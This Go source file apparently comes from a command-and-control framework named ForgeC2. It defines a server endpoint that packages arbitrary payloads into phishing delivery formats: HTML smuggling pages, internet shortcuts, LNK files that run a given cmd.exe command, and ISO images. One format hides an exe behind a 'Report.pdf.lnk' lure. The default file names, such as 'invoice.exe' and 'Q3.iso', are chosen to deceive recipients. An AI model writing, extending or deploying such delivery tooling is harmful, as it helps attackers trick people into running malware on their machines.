package server

import (
	"encoding/base64"
	"net/http"
	"path/filepath"
	"strings"

	"github.com/forgec2/forgec2/internal/payload"
	"github.com/gin-gonic/gin"
)

// handleGenerateDelivery wraps a payload as HTML smuggling, a .url shortcut,
// a cmd.exe LNK, or a minimal ISO 9660 image.
func (s *Server) handleGenerateDelivery(c *gin.Context) {
	var req struct {
		Format   string `json:"format"` // html, url, lnk, iso
		Filename string `json:"filename"`
		URL      string `json:"url"`
		Command  string `json:"command"`
		DataB64  string `json:"data_b64"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		respondError(c, http.StatusBadRequest, "invalid request")
		return
	}
	format := strings.ToLower(strings.TrimSpace(req.Format))
	filename := filepath.Base(req.Filename)

	var (
		out      []byte
		outName  string
		mime     string
		buildErr error
	)
	switch format {
	case "html", "html_smuggle", "smuggle":
		raw, err := decodeOptionalB64(req.DataB64)
		if err != nil {
			respondError(c, http.StatusBadRequest, "invalid data_b64")
			return
		}
		if filename == "" {
			filename = "invoice.exe"
		}
		out = payload.BuildHTMLSmuggling(filename, raw)
		outName = "smuggle.html"
		mime = "text/html"
	case "url", "shortcut":
		if req.URL == "" {
			respondError(c, http.StatusBadRequest, "url is required")
			return
		}
		out = payload.BuildURLShortcut(req.URL)
		outName = "target.url"
		mime = "application/internet-shortcut"
	case "lnk":
		if req.Command == "" {
			respondError(c, http.StatusBadRequest, "command is required")
			return
		}
		out, buildErr = payload.BuildCMDLnk(req.Command)
		outName = "shortcut.lnk"
		mime = "application/x-ms-shortcut"
	case "iso":
		raw, err := decodeOptionalB64(req.DataB64)
		if err != nil {
			respondError(c, http.StatusBadRequest, "invalid data_b64")
			return
		}
		if filename == "" {
			filename = "README.TXT"
		}
		out, buildErr = payload.BuildISO9660(filename, raw)
		outName = "drop.iso"
		mime = "application/x-iso9660-image"
	case "iso_lnk", "iso-lnk", "isolnk":
		raw, err := decodeOptionalB64(req.DataB64)
		if err != nil {
			respondError(c, http.StatusBadRequest, "invalid data_b64")
			return
		}
		if filename == "" {
			filename = "Report.pdf.exe"
		}
		lnkName := "Report.pdf.lnk"
		// filename is the hidden exe name
		out, buildErr = payload.BuildISOWithLNK(lnkName, filename, raw)
		outName = "Q3.iso"
		mime = "application/x-iso9660-image"
	default:
		respondError(c, http.StatusBadRequest, "format must be html, url, lnk, iso, or iso_lnk")
		return
	}
	if buildErr != nil {
		respondError(c, http.StatusBadRequest, buildErr.Error())
		return
	}
	s.LogAuditRecord(c, "generate_delivery", "generate", "", format+" "+outName, true, nil)
	respond(c, gin.H{
		"filename": outName,
		"mime":     mime,
		"data":     base64.StdEncoding.EncodeToString(out),
		"size":     len(out),
	})
}

func decodeOptionalB64(s string) ([]byte, error) {
	s = strings.TrimSpace(s)
	if s == "" {
		return []byte("ForgeC2"), nil
	}
	return base64.StdEncoding.DecodeString(s)
}
